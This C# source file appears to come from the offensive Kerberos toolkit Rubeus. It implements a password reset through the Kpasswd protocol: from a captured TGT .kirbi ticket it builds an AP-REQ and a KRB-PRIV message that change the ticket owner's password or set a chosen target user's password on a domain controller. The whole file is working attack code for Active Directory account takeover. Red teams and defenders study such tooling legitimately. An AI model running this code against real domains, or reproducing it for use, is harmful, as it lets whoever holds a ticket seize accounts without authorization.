using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Asn1;

namespace Rubeus
{
    public class Reset
    {
        [Flags]
        enum PasswordProperties {
            Complex = 0x1,
            NoAnonChange = 0x2,
            NoClearChange = 0x4,
            LockoutAdmins = 0x8,
            StoreCleartext = 0x10,
            RefusePasswordChange = 0x20
        }

        public static void UserPassword(KRB_CRED kirbi, string newPassword, string domainController = "", string targetUser = null)
        {
            // implements the Kerberos-based password reset originally disclosed by Aorato
            //      This function is misc::changepw in Kekeo
            // Takes a valid TGT .kirbi and builds a MS Kpasswd password change sequence
            //      AP-REQ with randomized sub session key
            //      KRB-PRIV structure containing ChangePasswdData, enc w/ the sub session key
            // reference: Microsoft Windows 2000 Kerberos Change Password and Set Password Protocols (RFC3244)

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return; }

            // extract the user and domain from the existing .kirbi ticket
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string userDomain = kirbi.enc_part.ticket_info[0].prealm;

            if (targetUser == null) {
                Console.WriteLine("[*] Changing password for user: {0}@{1}", userName, userDomain);
            } else {
                Console.WriteLine("[*] Resetting password for target user: {0}", targetUser);
            }

            Console.WriteLine("[*] New password value: {0}", newPassword);

            // build the AP_REQ using the user ticket's keytype and key
            Console.WriteLine("[*] Building AP-REQ for the MS Kpassword request");
            AP_REQ ap_req = new AP_REQ(userDomain, userName, kirbi.tickets[0], kirbi.enc_part.ticket_info[0].key.keyvalue, (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR);

            // create a new session subkey for the Authenticator and match the encryption type of the user key
            Console.WriteLine("[*] Building Authenticator with encryption key type: {0}", (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype);
            ap_req.authenticator.subkey = new EncryptionKey();
            ap_req.authenticator.subkey.keytype = kirbi.enc_part.ticket_info[0].key.keytype;

            // generate a random session subkey
            Random random = new Random();
            byte[] randKeyBytes;
            Interop.KERB_ETYPE randKeyEtype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
            if (randKeyEtype == Interop.KERB_ETYPE.rc4_hmac)
            {
                randKeyBytes = new byte[16];
                random.NextBytes(randKeyBytes);
                ap_req.authenticator.subkey.keyvalue = randKeyBytes;
            }
            else if (randKeyEtype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                randKeyBytes = new byte[32];
                random.NextBytes(randKeyBytes);
                ap_req.authenticator.subkey.keyvalue = randKeyBytes;
            }
            else
            {
                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");
                return;
            }

            Console.WriteLine("[*] base64(session subkey): {0}", Convert.ToBase64String(randKeyBytes));

            // randKeyBytes is now the session key used for the KRB-PRIV structure

            var rand = new Random();
            ap_req.authenticator.seq_number = (UInt32)rand.Next(1, Int32.MaxValue);

            // now build the KRV-PRIV structure
            Console.WriteLine("[*] Building the KRV-PRIV structure");
            KRB_PRIV changePriv = new KRB_PRIV(randKeyEtype, randKeyBytes);

            // the new password to set for the user
            if (targetUser != null) {
                var userParts = targetUser.Split('\\');
                if(userParts.Length != 2) {
                    Console.WriteLine("[X] /targetuser should be in the format domain.com\\username!");
                    return;
                }
                changePriv.enc_part = new EncKrbPrivPart(userParts[1], userParts[0].ToUpper(), newPassword, "lol");
            } else {
                changePriv.enc_part = new EncKrbPrivPart(newPassword, "lol");
            }

            // now build the final MS Kpasswd request
            byte[] apReqBytes = ap_req.Encode().Encode();
            byte[] changePrivBytes = changePriv.Encode().Encode();

            short messageLength = (short)(apReqBytes.Length + changePrivBytes.Length + 6);
            short version = -128;

            BinaryWriter bw = new BinaryWriter(new MemoryStream());

            //Message Length
            bw.Write(IPAddress.NetworkToHostOrder(messageLength));

            // Version (Reply)
            bw.Write(IPAddress.NetworkToHostOrder(version));

            //AP_REQ Length
            bw.Write(IPAddress.NetworkToHostOrder((short)apReqBytes.Length));

            //AP_REQ
            bw.Write(apReqBytes);

            //KRV-PRIV
            bw.Write(changePrivBytes);
            
            // KPASSWD_DEFAULT_PORT = 464
            byte[] response = Networking.SendBytes(dcIP, 464, ((MemoryStream)bw.BaseStream).ToArray());
            if (response == null)
            {
                return;
            }

            try
            {
                AsnElt responseAsn = AsnElt.Decode(response, false);

                // check the response value
                int responseTag = responseAsn.TagValue;

                if (responseTag == 30)
                {
                    // parse the response to an KRB-ERROR
                    KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                    return;
                }
            }
            catch { }

            // otherwise parse the resulting KRB-PRIV from the server
            BinaryReader br = new BinaryReader(new MemoryStream(response));
            short respMsgLen = IPAddress.NetworkToHostOrder(br.ReadInt16());
            short respVersion = IPAddress.NetworkToHostOrder(br.ReadInt16());
            short respAPReqLen = IPAddress.NetworkToHostOrder(br.ReadInt16());
            byte[] respAPReq = br.ReadBytes(respAPReqLen);
            byte[] respKRBPriv = br.ReadBytes((int)(br.BaseStream.Length - br.BaseStream.Position));

            // decode the KRB-PRIV response
            AsnElt respKRBPrivAsn = AsnElt.Decode(respKRBPriv, false);

            foreach(AsnElt elem in respKRBPrivAsn.Sub[0].Sub)
            {
                if(elem.TagValue == 3)
                {
                    byte[] encBytes = elem.Sub[0].Sub[1].GetOctetString();
                    byte[] decBytes = Crypto.KerberosDecrypt(randKeyEtype, Interop.KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART, randKeyBytes, encBytes);
                    AsnElt decBytesAsn = AsnElt.Decode(decBytes, false);

                    byte[] responseCodeBytes = decBytesAsn.Sub[0].Sub[0].Sub[0].GetOctetString();

                    br = new BinaryReader(new MemoryStream(responseCodeBytes));
                    short resultCode = IPAddress.NetworkToHostOrder(br.ReadInt16());                            
                    if (resultCode == 0)
                    {
                        Console.WriteLine("[+] Password change success!");
                    }
                    else
                    {
                        byte[] resultMessage = br.ReadBytes((int)(br.BaseStream.Length - br.BaseStream.Position));
                        string resultError = "";

                        if (resultMessage.Length > 2) {
                            if (resultMessage[0] == 0 && resultMessage[1] == 0) {
                                br = new BinaryReader(new MemoryStream(resultMessage));
                                br.ReadUInt16();
                                int minPasswordLen = IPAddress.NetworkToHostOrder(br.ReadInt32());
                                int passwordHistory = IPAddress.NetworkToHostOrder(br.ReadInt32());
                                PasswordProperties pprops = (PasswordProperties)IPAddress.NetworkToHostOrder((br.ReadInt32()));
                                TimeSpan expire = TimeSpan.FromTicks(IPAddress.NetworkToHostOrder(br.ReadInt64()));
                                TimeSpan min_passwordage = TimeSpan.FromTicks(IPAddress.NetworkToHostOrder(br.ReadInt64()));
                                resultError = $"Policy: \n\tMinimum Length: {minPasswordLen}\n\tPassword History: {passwordHistory}\n\tFlags: {pprops}\n\tExpiry: {expire:%d} day(s)\n\tMinimum Password Age: {min_passwordage:%d} day(s)";

                            } else {
                                resultError = Encoding.UTF8.GetString(resultMessage);
                            }
                        }

                        Console.WriteLine("[X] Password change error: {0} {1}", (Interop.KADMIN_PASSWD_ERR)resultCode, resultError);
                    }
                }
            }
        }
    }
}